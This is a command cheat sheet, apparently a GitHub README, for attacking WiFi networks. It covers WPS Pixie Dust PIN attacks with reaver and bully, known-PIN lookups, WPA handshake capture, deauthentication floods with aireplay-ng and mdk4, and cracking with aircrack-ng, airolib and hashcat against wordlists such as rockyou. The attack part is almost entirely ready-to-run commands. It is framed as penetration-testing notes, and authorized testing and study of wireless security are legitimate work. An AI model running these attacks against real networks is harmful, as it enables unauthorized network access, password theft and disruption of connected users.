# WIFI-PenTesting

## Connect to Remote Machine

```bash
ssh -p 22 u@ip
rdesktop -u username -p password -g 1920x1080 -a 16 -z -x l -P -r clipboard:PRIMARYCLIPBOARD -r disk:share=/path/to/local/folder remote_server_ip
```

```bash
sudo su
gzip -d rockyou.txt.gz
```

## Start Monitoring Mode

```bash
# Using airmo-ng
airmon-ng check
airmon-ng check kill
airmon-ng start wlan0
```

```bash
# Using ip and iw commands
ip link show # List available interfaces
ip link set wlan0 down
iw dev wlan0 set type monitor
ip link set wlan0 up
```

```bash
iwconfig # List available interfaces
airmon-ng check kill # Kill annoying processes
airmon-ng start wlan0 # Monitor mode
airmon-ng stop wlan0mon # Managed mode
airodump-ng wlan0mon # Scan (default 2.4GHz)
airodump-ng wlan0mon --band a # Scan 5GHz
iwconfig wlan0 mode monitor # Put in mode monitor
iwconfig wlan0mon mode managed # Quit mode monitor - managed mode
iw dev wlan0 scan | grep "^BSS\|SSID\|WSP\|Authentication\|WPS\|WPA" # Scan available WiFis
```

## WPS Attacks

### PIXIDUST Attack

```bash
sudo reaver -b {{bssid}} -i wlan0 -v -K
sudo bully -b {{bssid}} -v 4 -d wlan0
```

```bash
# Well known pins
sudo apt install airgeddon
source /usr/share/airgeddon/known_pins.db
echo ${PINDB["0013F7"]}
```

## WPA2/3 PSK Attacks

### Capture

```bash
airodump-ng wlan --wps
airodump-ng wlan0 -c 6 --bssid {{mac address of router}} -w /tmp/psk --output-format pcap
```

### Deauthenticate

```bash
aireplay-ng -0 0 wlan0 -e {{WIFI_name}} -a {{bssid}} -c {{client}}
# To send deauth to all clients remove the -c option
mdk4 wlan0mon d -c 5 -b victim_client_mac.txt -E WifiName -B {{bssid}}
```

### Cracking

Optimize aircrack with airolib

```bash
echo wifu > essid.txt # name of the wifi
airolib-ng wifu.sqlite --import essid essid.txt # create db for the essid
airolib-ng wifu.sqlite --import passwd /usr/share/john/password.lst # import password list into the DB
airolib-ng wifu.sqlite --batch # compute the Pairwise Master Keys (PMK)
airolib-ng wifu.sqlite --stats # show info
aircrack-ng -r wifu.sqlite wpa1-01.cap
```

```bash
aircrack-ng file.pcap # check for handshake in the file
aircrack-ng /tmp/att.pcap -w /usr/share/wordlists/rockyou.txt
/usr/share/john/password.lst
```

### Hashcat

```bash
sudo apt install hashcat-utils
/usr/lib/hashcat-utils/cap2hccapx.bin wifu-01.cap output.hccapx
hashcat -m 2500 output.hccapx /usr/share/john/password.lst
```

## Rogue Access Points

Create a WIFI replica using hostapd-mana to convince clients to connect to it instead of the original wifi

## Captive Portals

Connect to WIFI network from the terminal

```bash
wpa_supplicant
# [Reference](https://askubuntu.com/questions/120367/how-to-connect-to-wi-fi-ap-through-wps)
```
